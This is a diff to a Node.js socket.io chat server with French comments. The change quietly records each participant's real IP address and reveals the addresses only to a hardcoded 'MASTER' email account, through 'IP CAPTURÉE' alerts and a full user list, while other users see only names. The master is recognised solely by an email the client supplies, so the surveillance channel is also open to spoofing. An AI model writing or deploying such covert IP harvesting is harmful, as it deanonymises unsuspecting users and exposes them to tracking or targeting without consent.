@@ -3,28 +3,30 @@ const http = require('http');
 const { Server } = require('socket.io');
 
 const app = express();
+app.set('trust proxy', true); // Indispensable pour Render
+
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: "*" } });
 
 app.use(express.static(__dirname));
 
 let users = [];
-const MODO_EMAIL = "toucheur2pp@heaven.com";
+const MASTER = "toucheur2pp@heaven.com";
 
 io.on('connection', (socket) => {
-    // Extraction de l'IP réelle même derrière Render
-    let ip = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
-    if (ip.includes(',')) ip = ip.split(',')[0];
-    ip = ip.replace('::ffff:', '').trim();
+    // Récupération de l'IP réelle
+    let ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
+    if (ip && ip.includes(',')) ip = ip.split(',')[0];
+    ip = ip ? ip.replace('::ffff:', '').trim() : "0.0.0.0";
 
     socket.on('init', (data) => {
         const u = { id: socket.id, n: data.n, e: data.e, ip: ip };
         users.push(u);
 
-        // On prévient le Modo (toi) qu'une nouvelle IP est capturée
-        const boss = users.find(user => user.e === MODO_EMAIL);
-        if (boss && u.e !== MODO_EMAIL) {
-            io.to(boss.id).emit('chat', { n: "SYSTEM", t: { t: `🎯 IP CAPTURÉE : ${u.n} -> ${u.ip}`, type: 'intel' } });
+        // Alerte au Maître
+        const boss = users.find(user => user.e === MASTER);
+        if (boss && u.e !== MASTER) {
+            io.to(boss.id).emit('sys_msg', `⚠️ IP CAPTURÉE : ${u.n} -> ${u.ip}`);
         }
         updateAll();
     });
@@ -40,9 +42,9 @@ io.on('connection', (socket) => {
     });
 
     function updateAll() {
-        const boss = users.find(u => u.e === MODO_EMAIL);
-        if (boss) io.to(boss.id).emit('sync', users); // Toi tu vois tout (avec IP)
-        io.emit('sync', users.map(u => ({ id: u.id, n: u.n }))); // Eux voient juste les noms
+        const boss = users.find(u => u.e === MASTER);
+        if (boss) io.to(boss.id).emit('sync', users); // Le boss voit tout
+        io.emit('sync', users.map(u => ({ id: u.id, n: u.n }))); // Les autres voient les noms
     }
 });
 
